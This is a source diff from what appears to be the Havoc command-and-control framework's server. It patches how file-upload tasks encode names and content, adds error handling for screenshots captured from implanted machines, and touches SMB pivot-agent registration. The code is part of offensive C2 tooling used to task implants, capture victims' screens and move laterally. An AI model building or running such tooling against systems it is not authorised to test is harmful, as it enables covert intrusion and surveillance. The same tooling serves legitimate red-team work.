@@ -194,13 +194,13 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			ArgArray = strings.Split(Arguments, ";")
 
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[0]); err == nil {
-				FileName = []byte(common.EncodeUTF16(string(val)))
+				FileName = append([]byte(common.EncodeUTF16(string(val))), []byte{0, 0}...)
 			} else {
 				return Job{}, err
 			}
 
 			if val, err := base64.StdEncoding.DecodeString(ArgArray[1]); err == nil {
-				Content = []byte(common.EncodeUTF16(string(val)))
+				Content = val
 			} else {
 				return Job{}, err
 			}
@@ -321,6 +321,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 			break
 
 		case 4:
+
 			var (
 				Args           = strings.Split(Arguments, ";")
 				Process        any
@@ -330,6 +331,7 @@ func (a *Agent) TaskPrepare(Command int, Info any) (Job, error) {
 				ProcessVerbose int
 			)
 
+			// State, ProcessApp, Verbose, Piped, ProcessArg
 			if len(Args) > 4 {
 				ProcArgs, _ := base64.StdEncoding.DecodeString(Args[4])
 				ProcessArgs = string(ProcArgs)
@@ -2855,17 +2857,26 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 			var BmpBytes = Parser.ParseBytes()
 			var Name = "Desktop_" + time.Now().Format("02.01.2006-05.04.05") + ".png"
 
-			logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
+			if len(BmpBytes) > 0 {
+				logr.LogrInstance.DemonSaveScreenshot(a.NameID, Name, BmpBytes)
 
-			Message["Type"] = "Good"
-			Message["Message"] = "Successful took screenshot"
+				Message["Type"] = "Good"
+				Message["Message"] = "Successful took screenshot"
 
-			Message["MiscType"] = "screenshot"
-			Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
-			Message["MiscData2"] = Name
+				Message["MiscType"] = "screenshot"
+				Message["MiscData"] = base64.StdEncoding.EncodeToString(BmpBytes)
+				Message["MiscData2"] = Name
+			} else {
+				Message["Type"] = "Error"
+				Message["Message"] = "Failed to take a screenshot"
+			}
+		} else {
+			Message["Type"] = "Error"
+			Message["Message"] = "Failed to take a screenshot"
 		}
 
 		Funcs.DemonOutput(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
 		break
 
 	case COMMAND_NET:
@@ -3164,7 +3175,7 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 								a.Pivots.Links = append(a.Pivots.Links, DemonInfo)
 								DemonInfo.Info.MagicValue = AgentHdr.MagicValue
 
-								LogDemonCallback(DemonInfo)
+								// LogDemonCallback(DemonInfo)
 								Funcs.AppendDemon(DemonInfo)
 								pk := Funcs.EventNewDemon(DemonInfo)
 								Funcs.EventAppend(pk)
@@ -3240,7 +3251,6 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Routine
 							break
 						}
 					}
-
 				} else {
 					Message["Type"] = "Error"
 					Message["Message"] = fmt.Sprintf("[SMB] Failed to disconnect agent %x", AgentID)
